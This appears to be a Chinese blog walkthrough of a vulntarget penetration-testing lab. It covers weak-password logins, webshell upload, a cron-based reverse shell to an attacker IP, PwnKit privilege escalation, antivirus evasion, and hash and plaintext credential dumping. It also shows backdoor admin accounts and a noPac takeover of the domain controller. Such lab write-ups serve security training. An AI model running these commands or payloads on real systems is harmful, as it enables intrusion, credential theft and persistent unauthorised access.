去访问这个81端口  是个web服务</p><p><img src="../images/image-20231123194702413.png" alt="image-20231123194702413"></p><p>去google一下 发现存在个漏洞  <a href="https://xz.aliyun.com/t/9359">https://xz.aliyun.com/t/9359</a></p><p>扫一下目录  找后台  网站的那个登录入口时坏的  用不了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">11:06:02] 200 -  479B  - /404.html                                         </span><br><span class="line">[11:06:05] 403 -  548B  - /Public/                                          </span><br><span class="line">[11:06:08] 301 -  162B  - /A  -&gt;  http://192.168.52.128:81/A/               </span><br><span class="line">[11:06:10] 302 -    0B  - /admin.php  -&gt;  http://192.168.52.128:81/admin.php/Login/index.html</span><br><span class="line">[11:06:21] 301 -  162B  - /backup  -&gt;  http://192.168.52.128:81/backup/     </span><br><span class="line">[11:06:21] 403 -  548B  - /backup/                                          </span><br><span class="line">[11:06:23] 301 -  162B  - /cache  -&gt;  http://192.168.52.128:81/cache/       </span><br><span class="line">[11:06:23] 403 -  548B  - /cache/                                           </span><br><span class="line">[11:06:32] 200 -    4KB - /favicon.ico                                      </span><br><span class="line">[11:06:37] 200 -  917B  - /index.html                                       </span><br><span class="line">[11:06:37] 200 -   14KB - /index.php                                        </span><br><span class="line">[11:06:37] 200 -    0B  - /index.php/login/                                 </span><br><span class="line">[11:06:37] 301 -  162B  - /install  -&gt;  http://192.168.52.128:81/install/   </span><br><span class="line">[11:06:37] 200 -   75B  - /install/                                         </span><br><span class="line">[11:06:37] 200 -   75B  - /install/index.php?upgrade/</span><br><span class="line">[11:06:54] 200 -   22KB - /readme.txt                                       </span><br><span class="line">[11:06:55] 200 -  157B  - /robots.txt                                       </span><br><span class="line">[11:06:59] 200 -  495B  - /sitemap.xml                                      </span><br><span class="line">[11:07:00] 301 -  162B  - /static  -&gt;  http://192.168.52.128:81/static/     </span><br><span class="line">[11:07:08] 200 -  816B  - /web.config</span><br></pre></td></tr></table></figure><p>访问admin.php 找到后台管理入口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/admin123   弱口令登录成功</span><br></pre></td></tr></table></figure><p>于是去参考上面给的文章的步骤直接打就行了</p><p><img src="../images/image-20231123195043115.png" alt="image-20231123195043115"></p><p>成功写入  连蚁剑进行下一步操作</p><p><img src="../images/image-20231123195214018.png" alt="image-20231123195214018"></p><p>发现执行失败  看看是不是存在disable_function</p><p><img src="../images/image-20231123195243172.png" alt="image-20231123195243172"></p><p>使用蚁剑插件进行绕过</p><p><img src="../images/image-20231123195312397.png" alt="image-20231123195312397"></p><p>挨个试就能试出来的</p><p><img src="../images/image-20231123195342814.png" alt="image-20231123195342814"></p><p>成功 反弹个shell到攻击机上</p><p><img src="../images/image-20231123201958733.png" alt="image-20231123201958733"></p><p>然后写个定时任务   免得shell断了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;* * * * * bash -i &gt;&amp; /dev/tcp/192.168.52.129/3389 0&gt;&amp;1&quot; | crontab -  //写定时任务  </span><br><span class="line"></span><br><span class="line">echo $(crontab -l | grep -v &quot;* * * * * bash -i &gt;&amp; /dev/tcp/192.168.52.129/3389 0&gt;&amp;1&quot;) | crontab -   //删除定时任务</span><br></pre></td></tr></table></figure><p>这里sudo -l  和suid没有发现什么可用于提权的  于是上线viper跑一下看看有没有内核提权</p><p>上传个elf文件运行就行了</p><p><img src="../images/image-20231123202610436.png" alt="image-20231123202610436"></p><p>如何跑一下提权exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line"></span><br><span class="line">set sessions 1</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; run</span><br><span class="line">[*] 192.168.52.128 - Collecting local exploits for x64/linux...</span><br><span class="line">[*] 192.168.52.128 - 188 exploit checks are being tried...</span><br><span class="line">[+] 192.168.52.128 - exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: The target is vulnerable.</span><br><span class="line">[+] 192.168.52.128 - exploit/linux/local/network_manager_vpnc_username_priv_esc: The service is running, but could not be validated.</span><br><span class="line">[+] 192.168.52.128 - exploit/linux/local/pkexec: The service is running, but could not be validated.</span><br><span class="line">[+] 192.168.52.128 - exploit/linux/local/ptrace_traceme_pkexec_helper: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.52.128 - exploit/linux/local/su_login: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.52.128 - exploit/linux/local/sudo_baron_samedit: The target appears to be vulnerable. sudo 1.8.23 is a vulnerable build.</span><br><span class="line">[-] 192.168.52.128 - Post interrupted by the console user</span><br></pre></td></tr></table></figure><p>如何就会发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: The target is vulnerable.</span><br></pre></td></tr></table></figure><p>这个模块可以跑  于是直接上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231123203055708.png" alt="image-20231123203055708"></p><p>成功拿到root权限  现在开始查看内网ip  先弹个shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line">ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.52.128  netmask 255.255.255.0  broadcast 192.168.52.255</span><br><span class="line">        inet6 fe80::6eb2:c966:5aac:35d2  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:f9:82:6d  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 90995  bytes 21146861 (20.1 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 81592  bytes 16363478 (15.6 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">ens37: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.0.20.30  netmask 255.255.255.0  broadcast 10.0.20.255</span><br><span class="line">        inet6 fe80::1162:e042:35a0:5cd0  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:f9:82:77  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 25  bytes 2701 (2.6 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 13  bytes 992 (992.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><p>存在一个内网地址  10.0.20.30 使用fscan扫一下</p><p><img src="../images/image-20231123203905591.png" alt="image-20231123203905591"></p><p>发现扫的时候就扫出来了这个30 就是我们本机自己  于是就猜测是不是内网其他主机开了防火墙</p><p>于是直接扫端口  不ping了  这里的-p 最好是指定固定ip不然会扫的很慢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64 -h 10.0.20.0/24 -np -p 21,22,80,81,135,139,445,8080,8081,3306,6379</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@bogon tmp]# ./fscan_amd64 -h 10.0.20.0/24 -np -p 21,22,80,81,135,139,445,8080,8081,3306,6379</span><br><span class="line">&lt;md64 -h 10.0.20.0/24 -np -p 21,22,80,81,135,139,445,8080,8081,3306,6379     </span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">10.0.20.30:22 open</span><br><span class="line">10.0.20.30:80 open</span><br><span class="line">10.0.20.30:21 open</span><br><span class="line">10.0.20.30:81 open</span><br><span class="line">10.0.20.66:8080 open</span><br><span class="line">10.0.20.30:3306 open</span><br><span class="line">10.0.20.66:3306 open</span><br><span class="line">[*] alive ports len is: 7</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle: http://10.0.20.30         code:200 len:1326   title:没有找到站点</span><br><span class="line">[*] WebTitle: http://10.0.20.30:81      code:200 len:14380  title:极致CMS建站系统</span><br><span class="line">[*] WebTitle: http://10.0.20.66:8080    code:200 len:141    title:None</span><br><span class="line">[+] InfoScan:http://10.0.20.66:8080    [禅道] </span><br></pre></td></tr></table></figure><p>这里的话是扫出来了66这个ip  这个ip只开了8080和3306端口</p><p>使用stowaway挂个代理  进去看看</p><p><img src="../images/image-20231123205036892.png" alt="image-20231123205036892"></p><p>同样是弱口令进行登录  admin/Admin123</p><p><img src="../images/image-20231123205917280.png" alt="image-20231123205917280"></p><p>windows机器</p><p><a href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93%3C%3D12.4.2%20%E5%90%8E%E5%8F%B0getshell/">禅道漏洞</a></p><p>跟着复现就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip本身是没有的  我们的得自己下来安装</span><br><span class="line"></span><br><span class="line">$ curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py   # 下载安装脚本</span><br><span class="line">$ sudo python get-pip.py    # 运行安装脚本</span><br></pre></td></tr></table></figure><p>如何就能下载下来pip了  然后使用pip安装pyftpdlib模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pip install pyftpdlib</span><br><span class="line"></span><br><span class="line">python -m pyftpdlib -p 24 -d .   //默认开启了匿名</span><br><span class="line"></span><br><span class="line">然后</span><br><span class="line"></span><br><span class="line">ftp://10.0.20.30:24/shell.php</span><br><span class="line"></span><br><span class="line">//这里的用24的原因是21端口已经开了</span><br></pre></td></tr></table></figure><p>然后访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data/client/1/shell.php   就行了</span><br><span class="line"></span><br><span class="line">//这里我不知道为啥写入的是空的  然后就自己手动加进去了</span><br></pre></td></tr></table></figure><p>然后连蚁剑就行了</p><p><img src="../images/image-20231123210412047.png" alt="image-20231123210412047"></p><p>低权限用户  看看能不能提权</p><p><img src="../images/image-20231123210446160.png" alt="image-20231123210446160"></p><p>这个东西开了  可以使用土豆提权  先看看进程  看看有没有杀软</p><p><img src="../images/image-20231123210552153.png" alt="image-20231123210552153"></p><p>存在火绒  不知道土豆传上去会不会被杀  于是先去github上面找个免杀项目上viper后看看</p><p><a href="https://github.com/1y0n/AV_Evasion_Tool">https://github.com/1y0n/AV_Evasion_Tool</a></p><p>先生成c文件  然后丢进去生成exe文件就行了</p><p><img src="../images/image-20231123210918845.png" alt="image-20231123210918845"></p><p>将c文件丢进去就行了   然后上传那个exe文件到机器上运行就行了</p><p><img src="../images/image-20231123211801222.png" alt="image-20231123211801222"></p><p>成功上线  因为是土豆提权  那么找个 msf自带的getsystem也是用土豆提权的  所以尝试一下</p><p><img src="../images/image-20231123211921526.png" alt="image-20231123211921526"></p><p>直接就是system权限  于是导出hash</p><p><img src="../images/image-20231123212016413.png" alt="image-20231123212016413"></p><p><a href="https://blog.csdn.net/shayebudon/article/details/124515853">net 命令大全</a></p><p>这里教一个查域控的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public&gt; net time /domain</span><br><span class="line">\\WIN-UH20PRD3EAO.vulntarget.com 的当前时间是 ?2023/?11/?23 21:21:48</span><br><span class="line"></span><br><span class="line">查到域控主机名</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public&gt; ping WIN-UH20PRD3EAO.vulntarget.com</span><br><span class="line">正在 Ping WIN-UH20PRD3EAO.vulntarget.com [10.0.10.100] 具有 32 字节的数据:</span><br><span class="line">来自 10.0.10.100 的回复: 字节=32 时间&lt;1ms TTL=128</span><br><span class="line">来自 10.0.10.100 的回复: 字节=32 时间&lt;1ms TTL=128</span><br><span class="line">来自 10.0.10.100 的回复: 字节=32 时间&lt;1ms TTL=128</span><br><span class="line">来自 10.0.10.100 的回复: 字节=32 时间&lt;1ms TTL=128</span><br><span class="line">10.0.10.100 的 Ping 统计信息:</span><br><span class="line">    数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，</span><br><span class="line">往返行程的估计时间(以毫秒为单位):</span><br><span class="line">    最短 = 0ms，最长 = 0ms，平均 = 0ms</span><br><span class="line">    </span><br><span class="line">使用ping命令发现主机地址  (能ping通的前提下)</span><br></pre></td></tr></table></figure><p>使用nslookup域名解析也行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public&gt; nslookup WIN-UH20PRD3EAO.vulntarget.com</span><br><span class="line">DNS request timed out.</span><br><span class="line">    timeout was 2 seconds.</span><br><span class="line">������:  UnKnown</span><br><span class="line">Address:  10.0.10.100</span><br><span class="line">����:    WIN-UH20PRD3EAO.vulntarget.com</span><br><span class="line">Address:  10.0.10.100</span><br></pre></td></tr></table></figure><p>获取到system权限后  我们直接导出域内hash就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line"></span><br><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c35945f73d9b85be7064e79706e1baa4:::</span><br><span class="line">win10:1001:aad3b435b51404eeaad3b435b51404ee:6334d634017bb5a1ef02e6e2b158840b:::</span><br><span class="line"></span><br><span class="line">//这个是导出本地管理员的</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">creds_all</span><br><span class="line"></span><br><span class="line">meterpreter &gt; creds_all</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving all credentials</span><br><span class="line">msv credentials</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">Username  Domain      NTLM                              SHA1                                      DPAPI</span><br><span class="line">--------  ------      ----                              ----                                      -----</span><br><span class="line">WIN10$    VULNTARGET  44881dfca44eebd45932eb52b045ccc2  2b172d3ceb1c9ce19278c78425287be2c03df0ea</span><br><span class="line">win101    VULNTARGET  282d975e35846022476068ab5a3d72df  bc9ecca8d006d8152bd51db558221a0540c9d604  8d6103509e746ac0ed9641f7c21d7cf7</span><br><span class="line"></span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Username  Domain      Password</span><br><span class="line">--------  ------      --------</span><br><span class="line">(null)    (null)      (null)</span><br><span class="line">WIN10$    VULNTARGET  (null)</span><br><span class="line">win101    VULNTARGET  (null)</span><br><span class="line"></span><br><span class="line">kerberos credentials</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">Username  Domain          Password</span><br><span class="line">--------  ------          --------</span><br><span class="line">(null)    (null)          (null)</span><br><span class="line">WIN10$    VULNTARGET.COM  (null)</span><br><span class="line">WIN10$    vulntarget.com  d5 b7 6a 61 89 2a 6a 1e 08 d3 78 43 41 8c de 75 55 4c a9 17 cd 00 a8 81 3f 26 fa 82 b0 84 f4 08 55 2f f5 0f 08 e1 72 0d ca 91 98 93 19 ac a3 7b 6a 53 dc f6 b2 15 aa aa 35 c7 d5 86 8d 95 3f 69 04 ce ef 6f b6 8d 72 a8 e5 8c 32 3b 4b 28 81 91 d0 74 9b 69 0b f2 9d ad 1c e4 d9 0d 39 a8 ce 82 77 d0 d6 c6 95 a0 a2 77 34 65 bd 4d a4 5d 29 fe 2a df 77 b1 a2 f4 5b c9 39 fa dd 2f 2a 61 91 d5 87 21 15 36 a0 1f 7d 4c 94 e7 89 33 4b 68 3b b2 fa 38 45 04 76 83 e9 c2 97 fc 14 30 ee 19 ed ba 72 25 5d 87 e9 d4 55 eb 49 66 bb 55 39 9f 6b 0c 8f 44 c9 a7 f4 c1 91 b2 d1 4b 79 2f ac c1 38 fe 2c d0 2e a0 27 0e d1 23 1e 97 16 9e 60 56 86 20 e4 ea 66 aa 65 cd cc f9 db 29 8d d5 7e 42 b1 a6 b9 66 5b ea f6 dc ca b4 a3 e4 6f 35 26 84 26 25</span><br><span class="line">win10$    VULNTARGET.COM  (null)</span><br><span class="line">win101    VULNTARGET.COM  (null)</span><br></pre></td></tr></table></figure><p>win2012以后解决不到处明文的方法</p><p><a href="https://www.anquanke.com/post/id/175364">https://www.anquanke.com/post/id/175364</a></p><p>这个是只能导出域内hash值  password是null  那么通过我们修改注册表的方法是可以进行password显示出来的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231123213048096.png" alt="image-20231123213048096"></p><p>如何让这台机器的账户重新进行登录就行了</p><p><img src="../images/image-20231123213237658.png" alt="image-20231123213237658"></p><p>成功的抓取到了密码</p><p>上传那个sharphound进去跑一下分析一下域内环境</p><p><img src="../images/image-20231123214748834.png" alt="image-20231123214748834"></p><p>能成功的rdp上去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /t REG_DWORD /v portnumber /d 3389 /f</span><br><span class="line"></span><br><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br><span class="line"></span><br><span class="line">//上面的代码时开启了3389端口</span><br><span class="line"></span><br><span class="line">//下面的代码时新加一个用户到本地管理员组如何rdp上去</span><br><span class="line"></span><br><span class="line">net user Ke1nys qwer1234! /add</span><br><span class="line">net localgroup administrators Ke1nys /add</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe --CollectionMethods All --Domain vulntarget.com --ExcludeDCs</span><br></pre></td></tr></table></figure><p>扫一下ip</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Ethernet adapter Ethernet0:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : </span><br><span class="line">   Link-local IPv6 Address . . . . . : fe80::8c22:e9be:8a8c:2b3c%12</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 10.0.20.66</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : </span><br><span class="line"></span><br><span class="line">Ethernet adapter Ethernet1:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : </span><br><span class="line">   Link-local IPv6 Address . . . . . : fe80::14f3:2c89:4bb1:cc63%6</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 10.0.10.99</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br></pre></td></tr></table></figure><p>存在这个10段</p><p>fscan扫一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public&gt;fscan64.exe -h 10.0.10.0/24 -p 1-10000</span><br><span class="line">fscan64.exe -h 10.0.10.0/24 -p 1-10000</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 10.0.10.99      is alive</span><br><span class="line">(icmp) Target 10.0.10.100     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 2</span><br><span class="line">10.0.10.100:88 open</span><br><span class="line">10.0.10.100:53 open</span><br><span class="line">10.0.10.100:110 open</span><br><span class="line">10.0.10.99:110 open</span><br><span class="line">10.0.10.99:139 open</span><br><span class="line">10.0.10.100:25 open</span><br><span class="line">10.0.10.99:25 open</span><br><span class="line">10.0.10.100:139 open</span><br><span class="line">10.0.10.100:135 open</span><br><span class="line">10.0.10.99:135 open</span><br><span class="line">10.0.10.100:389 open</span><br><span class="line">10.0.10.100:445 open</span><br><span class="line">10.0.10.99:445 open</span><br><span class="line">10.0.10.100:464 open</span><br><span class="line">10.0.10.100:593 open</span><br><span class="line">10.0.10.100:636 open</span><br><span class="line">10.0.10.100:3268 open</span><br><span class="line">10.0.10.100:3269 open</span><br><span class="line">10.0.10.99:3306 open</span><br><span class="line">10.0.10.99:3389 open</span><br><span class="line">10.0.10.99:5040 open</span><br><span class="line">10.0.10.100:5985 open</span><br><span class="line">10.0.10.99:8080 open</span><br><span class="line">10.0.10.100:9389 open</span><br><span class="line">[*] alive ports len is: 24</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]10.0.10.100</span><br><span class="line">   [-&gt;]WIN-UH20PRD3EAO</span><br><span class="line">   [-&gt;]10.0.10.100</span><br><span class="line">[+] 10.0.10.100 MS17-010        (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios: 10.0.10.100     [+]DC WIN-UH20PRD3EAO.vulntarget.com      Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] WebTitle: http://10.0.10.100:5985   code:404 len:315    title:Not Found</span><br><span class="line">[*] WebTitle: http://10.0.10.99:8080    code:200 len:141    title:None</span><br><span class="line">[+] InfoScan:http://10.0.10.99:8080    [禅道] </span><br><span class="line">[+] RDP:10.0.10.99:3389:administrator admin@123</span><br><span class="line">已完成 24/24</span><br><span class="line">[*] 扫描结束,耗时: 2m50.6807079s</span><br></pre></td></tr></table></figure><p>发现域控主机   10.0.10.100</p><p>然后挂二级代理  然后打nopac   明天好好研究一下为啥能打nopac</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 noPac.py vulntarget.com/win101 -hashes &#x27;:282d975e35846022476068ab5a3d72df&#x27; -dc-ip 10.0.10.100 --impersonate Administrator -create-child -use-ldap -shell</span><br><span class="line"></span><br><span class="line">执行该命令</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231123224306319.png" alt="image-20231123224306319"></p><p>拿下域控</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">添加域管</span><br><span class="line"></span><br><span class="line">net user admin QWEasd@123 /add /domain</span><br><span class="line">net group &quot;Domain Admins&quot; admin /add /domain</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
